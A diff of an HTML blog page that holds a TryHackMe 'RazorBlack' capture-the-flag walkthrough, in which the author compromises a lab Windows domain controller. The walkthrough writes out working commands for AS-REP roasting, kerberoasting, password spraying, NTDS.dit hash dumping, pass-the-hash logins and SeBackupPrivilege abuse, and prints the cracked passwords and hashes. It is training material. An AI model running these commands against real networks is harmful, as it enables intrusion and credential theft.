@@ -20,7 +20,17 @@
 
 <title>Animesh Roy | Classroom Posts</title>
 <meta name="title" content="Animesh Roy | Blogs & Writeups">
-<meta name="description" content="This blog contents writeups from CTFs and other infosec related posts also some task related to Classroom training">
+<meta name="description" content="Animesh Roy has more than a decade worth experience working in cyber security domain. He has worked with governments, corporates, colleges and universities, defence, and the community. He also running a community “Arishti Live” to help everyone who wants to, or work in cyber security domain. His expertise on training & consulting are the best of both the world. He uses his real-life case studies in trainings, to help candidates to understand the job in better ways.">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SPD6BXK0P5"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SPD6BXK0P5');
+</script>
 
 
 
@@ -52,23 +62,6 @@
 
 
 
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-NZBEX7RBNF"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-NZBEX7RBNF');
-</script>
-
-<script type="text/javascript">
-  (function(c,l,a,r,i,t,y){
-      c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-      t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-      y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-  })(window, document, "clarity", "script", "6gp5990ghr");
-</script>
-
 
 <link rel="canonical" href="https://classroom.anir0y.in/post/tryhackme-raz0rblack/" />
 
@@ -76,9 +69,10 @@
 <meta property="og:title" content="TryHackMe RazorBlack" />
 <meta property="og:description" content="TryHackMe Room RazorBlack solved by Animesh Roy. this is a walkthough. These guys call themselves hackers. Can you show them who&#39;s the boss ??" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-raz0rblack/" />
+<meta property="og:url" content="https://classroom.anir0y.in/post/tryhackme-raz0rblack/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-07-18T19:31:05+05:30" />
 <meta property="article:modified_time" content="2021-07-18T19:31:05+05:30" />
+
 
 
 
@@ -239,7 +233,7 @@
                 Sunday, Jul 18, 2021
               
 
-            | 11minuteRead
+            | 11 minutes read
 
             | Update at
               
@@ -273,7 +267,7 @@
 <ul>
 <li>
 <p>nmap</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -oN nmap/init 10.10.149.120
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC -oN nmap/init 10.10.149.120
 <span style="color:#75715e"># Nmap 7.91 scan initiated Sun Jul 18 19:35:34 2021 as: nmap -sV -sC -oN nmap/init 10.10.149.120</span>
 Nmap scan report <span style="color:#66d9ef">for</span> 10.10.149.120
 Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
@@ -329,20 +323,20 @@ Service detection performed. Please report any incorrect results at https://nmap
 <li>
 <p>SMB</p>
 <p><strong>SMBMAP</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/raz0rblack<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/raz0rblack<span style="color:#f92672">]</span>
 └─$ smbmap -u <span style="color:#e6db74">&#39;&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> -H 10.10.149.120                                        <span style="color:#ae81ff">2</span> ⨯
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: 10.10.149.120:445       Name: 10.10.149.120 
 </code></pre></div></li>
 <li>
 <p>showmount</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/raz0rblack<span style="color:#f92672">]</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>anir0y㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/share/thm/room/raz0rblack<span style="color:#f92672">]</span>
 └─$ showmount -e 10.10.149.120      
 Export list <span style="color:#66d9ef">for</span> 10.10.149.120:
 /users <span style="color:#f92672">(</span>everyone<span style="color:#f92672">)</span>
 </code></pre></div></li>
 <li>
 <p>showmount shows us one dir, let&rsquo;s mount it to local machine and continue:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh"><span style="color:#75715e"># create a mount dir</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh"><span style="color:#75715e"># create a mount dir</span>
 $ mkdir smb
 $ sudo mount -t nfs -o vers<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> 10.10.149.120:/users ./smb
 $ sudo -i 
@@ -360,7 +354,7 @@ THM<span style="color:#f92672">{</span>flag-data<span style="color:#f92672">}</s
 </li>
 <li>
 <p>content</p>
-<pre><code class="language-notepad" data-lang="notepad">daven port
+<pre tabindex="0"><code class="language-notepad" data-lang="notepad">daven port
 imogen royce
 tamara vidal
 arthur edwards
@@ -376,7 +370,7 @@ chamber lin
 <li>
 <p>create a users file based on <code>employee list</code>
 I tried with hashcat to create userlist, but turns out format is First letter of <code>First Name + Last name: i.e. dport for daven port</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cat user.lst
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$cat user.lst
 dport
 iroyce
 tvidal
@@ -392,7 +386,7 @@ clin
 </code></pre></div></li>
 <li>
 <p>DNS, let&rsquo;s map the domain to IP</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /etc/hosts
 10.10.149.120   raz0rblack raz0rblack.thm
 </code></pre></div></li>
 </ul>
@@ -415,7 +409,7 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>let&rsquo;s go</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 /opt/impacket/examples/GetNPUsers.py <span style="color:#e6db74">&#39;raz0rblack.thm/&#39;</span> -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 /opt/impacket/examples/GetNPUsers.py <span style="color:#e6db74">&#39;raz0rblack.thm/&#39;</span> -usersfile user.lst -no-pass -dc-ip MACHINE_IP -format hashcat -outputfile hashes.asreproast
 
 Impacket v0.9.24.dev1+20210706.140217.6da655ca - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
 
@@ -446,7 +440,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d
 </code></pre></div></li>
 <li>
 <p>trying loggin in with new creds (SMB)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbmap -H MACHINE_IP -u twilliams -p roastpotatoes
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
    Disk                                                    Permissions     Comment
    ----                                                    -----------     -------
@@ -459,7 +453,7 @@ $krb5asrep$23$twilliams@RAZ0RBLACK.THM:c9a4cd51d976e6b0138462b5f79eaf7b$f932933d
 </code></pre></div></li>
 <li>
 <p>we can read IPC$, that means we can bruteforce ussernames:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -u <span style="color:#e6db74">&#39;twilliams&#39;</span> -p <span style="color:#e6db74">&#39;roastpotatoes&#39;</span> --rid-brute
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -u <span style="color:#e6db74">&#39;twilliams&#39;</span> -p <span style="color:#e6db74">&#39;roastpotatoes&#39;</span> --rid-brute
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> First time use detected
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating home directory structure
 <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Creating default workspace
@@ -504,18 +498,18 @@ SMB         10.10.149.120   <span style="color:#ae81ff">445</span>    HAVEN-DC  
 </code></pre></div></li>
 <li>
 <p>new users add them to a file</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xyan1d3
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">xyan1d3
 lvetrova
 sbradley
 twilliams
 </code></pre></div></li>
 <li>
 <p>Password:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roastpotatoes
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">roastpotatoes
 </code></pre></div></li>
 <li>
 <p>checking for password reuse:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -u user.lst  -p pass.lst                                             <span style="color:#ae81ff">130</span> ⨯
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ crackmapexec smb <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -u user.lst  -p pass.lst                                             <span style="color:#ae81ff">130</span> ⨯
 
 SMB         10.10.149.120   <span style="color:#ae81ff">445</span>    HAVEN-DC         <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows 10.0 Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:HAVEN-DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:raz0rblack.thm<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
 SMB         10.10.149.120   <span style="color:#ae81ff">445</span>    HAVEN-DC         <span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> raz0rblack.thm<span style="color:#ae81ff">\x</span>yan1d3:roastpotatoes STATUS_LOGON_FAILURE 
@@ -524,7 +518,7 @@ SMB         10.10.149.120   <span style="color:#ae81ff">445</span>    HAVEN-DC  
 </code></pre></div></li>
 <li>
 <p>let&rsquo;s change the password for <code>sbradley</code></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbpasswd -r <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -U sbradley                                                                    <span style="color:#ae81ff">1</span> ⨯
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbpasswd -r <span style="color:#66d9ef">$(</span>cat hosts<span style="color:#66d9ef">)</span> -U sbradley                                                                    <span style="color:#ae81ff">1</span> ⨯
 Old SMB password: <span style="color:#e6db74">`</span>roastpotatoes<span style="color:#e6db74">`</span>
 New SMB password: <span style="color:#e6db74">`</span>Passw0rd!<span style="color:#e6db74">`</span>
 Retype new SMB password: <span style="color:#e6db74">`</span>Passw0rd!<span style="color:#e6db74">`</span>
@@ -532,7 +526,7 @@ Password changed <span style="color:#66d9ef">for</span> user sbradley <span styl
 </code></pre></div></li>
 <li>
 <p>Enumerate SMB with new password:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbmap -H MACHINE_IP -u sbradley -p <span style="color:#e6db74">&#39;Passw0rd!&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbmap -H MACHINE_IP -u sbradley -p <span style="color:#e6db74">&#39;Passw0rd!&#39;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> IP: MACHINE_IP:445        Name: MACHINE_IP
      Disk                                                    Permissions     Comment
      ----                                                    -----------     -------
@@ -559,7 +553,7 @@ smb: <span style="color:#ae81ff">\&gt;</span> mget *
 </code></pre></div></li>
 <li>
 <p>Cracking the zip and looking at contents:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># convert to hash that john can crack</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># convert to hash that john can crack</span>
 root@kali$ zip2john experiment_gone_wrong.zip &gt; hash
 
 
@@ -598,15 +592,15 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>Extract hashes</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL &gt; hashes.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /opt/impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL &gt; hashes.txt
 </code></pre></div></li>
 <li>
 <p>We need to extract all NTHASHes</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat hashes.txt| cut -d <span style="color:#e6db74">&#34;:&#34;</span> -f <span style="color:#ae81ff">4</span> &gt; pothashes.txt  
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat hashes.txt| cut -d <span style="color:#e6db74">&#34;:&#34;</span> -f <span style="color:#ae81ff">4</span> &gt; pothashes.txt  
 </code></pre></div></li>
 <li>
 <p>After that you need to remove the first few lines, so you only have hashes in there. Then you can bruteforce and get the correct hash:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">crackmapexec smb MACHINE_IP -u lvetrova -H pothashes.txt
 ...<span style="color:#f92672">[</span>snip<span style="color:#f92672">]</span>...
 SMB         MACHINE_IP    <span style="color:#ae81ff">445</span>    HAVEN-DC         <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> raz0rblack.thm<span style="color:#ae81ff">\l</span>vetrova f220d3988deb3f516c73f40ee16c431d
 </code></pre></div></li>
@@ -616,7 +610,7 @@ SMB         MACHINE_IP    <span style="color:#ae81ff">445</span>    HAVEN-DC    
 <ul>
 <li>
 <p>Login: (with hash we found earlier)</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">evil-winrm -i MACHINE_IP -u lvetrova -H f220d3988deb3f516c73f40ee16c431d
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\l</span>vetrova<span style="color:#ae81ff">\D</span>ocuments&gt; whoami
 raz0rblack<span style="color:#ae81ff">\l</span>vetrova
 
@@ -634,7 +628,7 @@ THM<span style="color:#f92672">{</span>flag-data<span style="color:#f92672">}</s
 <ul>
 <li>
 <p>Kerberoasting with pass-the-hash with lvetrovas creds:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP raz0rblack.thm/lvetrova -hashes f220d3988deb3f516c73f40ee16c431d:f220d3988deb3f516c73f40ee16c431d -outputfile hashes.kerberoast
 
 ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
 -------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
@@ -662,7 +656,7 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>login:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ evil-winrm -i MACHINE_IP -u xyan1d3 -p cyanide9amine5628
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\x</span>yan1d3<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\x</span>yan1d3&gt; $Credential <span style="color:#f92672">=</span> Import-Clixml -Path <span style="color:#e6db74">&#34;xyan1d3.xml&#34;</span>
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\x</span>yan1d3&gt; $Credential.GetNetworkCredential<span style="color:#f92672">()</span>.password
@@ -674,7 +668,7 @@ LOL here it is -&gt; THM<span style="color:#f92672">{</span>62ca7e0b901aa8f0b233
 <ul>
 <li>
 <p>check privileges:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\x</span>yan1d3&gt; whoami /all
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\x</span>yan1d3&gt; whoami /all
 
 <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
 
@@ -692,7 +686,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 </code></pre></div></li>
 <li>
 <p>Abuse Backup Privs (important: diskshadow.txt has a space after each line):</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># create `diskshadow.txt` file content are follwoing</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># create `diskshadow.txt` file content are follwoing</span>
 root@kali$ cat diskshadow.txt
 set metadata C:<span style="color:#ae81ff">\t</span>mp<span style="color:#ae81ff">\t</span>mp.cabs 
 set context persistent nowriters 
@@ -741,14 +735,14 @@ The shadow copy was successfully exposed as h:<span style="color:#ae81ff">\.</sp
 </li>
 <li>
 <p>Get dll’s to abuse Backup Privs:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
 
 root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
 
 </code></pre></div></li>
 <li>
 <p>Upload, import, abuse:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>mp&gt; upload SeBackupPrivilegeUtils.dll
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>mp&gt; upload SeBackupPrivilegeUtils.dll
 
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\t</span>mp&gt; upload SeBackupPrivilegeCmdLets.dll
 
@@ -767,7 +761,7 @@ root@kali$ wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBa
 </code></pre></div></li>
 <li>
 <p>Dump the hashes:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ python3 /opt/impacket/examples/secretsdump.py -system system -ntds ntds.dit LOCAL
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
@@ -802,7 +796,7 @@ raz0rblack.thm<span style="color:#ae81ff">\t</span>williams:des-cbc-md5:01e958b0
 </code></pre></div></li>
 <li>
 <p>Get admin flag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali$ evil-winrm -i 10.10.2.26 -u administrator -H 9689931bed40ca5a2ce1218210177f0c
 
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\a</span>dministrator<span style="color:#ae81ff">\D</span>ocuments&gt; cd ..
 
@@ -823,7 +817,7 @@ raz0rblack.thm<span style="color:#ae81ff">\t</span>williams:des-cbc-md5:01e958b0
 </code></pre></div></li>
 <li>
 <p>Copy the password and convert from hex to get the flag:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">root@kali$ python3                                                                          
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">root@kali$ python3                                                                          
 Python 3.9.2 <span style="color:#f92672">(</span>default, Feb <span style="color:#ae81ff">28</span> 2021, 17:03:44<span style="color:#f92672">)</span> 
 <span style="color:#f92672">[</span>GCC 10.2.1 20210110<span style="color:#f92672">]</span> on linux
 Type <span style="color:#e6db74">&#34;help&#34;</span>, <span style="color:#e6db74">&#34;copyright&#34;</span>, <span style="color:#e6db74">&#34;credits&#34;</span> or <span style="color:#e6db74">&#34;license&#34;</span> <span style="color:#66d9ef">for</span> more information.
@@ -857,7 +851,7 @@ data-ad-slot="7160066188"></ins></p>
 <ul>
 <li>
 <p>As Administrator:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>williams&gt; type .<span style="color:#ae81ff">\d</span>efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\u</span>sers<span style="color:#ae81ff">\t</span>williams&gt; type .<span style="color:#ae81ff">\d</span>efinitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
 THM<span style="color:#f92672">{</span>5144f2c4107b7cab04916724e3749fb0<span style="color:#f92672">}</span>
 </code></pre></div></li>
 </ul>
@@ -866,7 +860,7 @@ THM<span style="color:#f92672">{</span>5144f2c4107b7cab04916724e3749fb0<span sty
 <ul>
 <li>
 <p>Enumerate all folders and find top secret path:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cd <span style="color:#e6db74">&#34;C:\Program Files\Top Secret&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">*Evil-WinRM* PS C:<span style="color:#ae81ff">\&gt;</span> cd <span style="color:#e6db74">&#34;C:\Program Files\Top Secret&#34;</span>
 *Evil-WinRM* PS C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\T</span>op Secret&gt; dir
 Directory: C:<span style="color:#ae81ff">\P</span>rogram Files<span style="color:#ae81ff">\T</span>op Secret
 
@@ -909,7 +903,7 @@ data-ad-slot="7160066188"></ins></p>
 
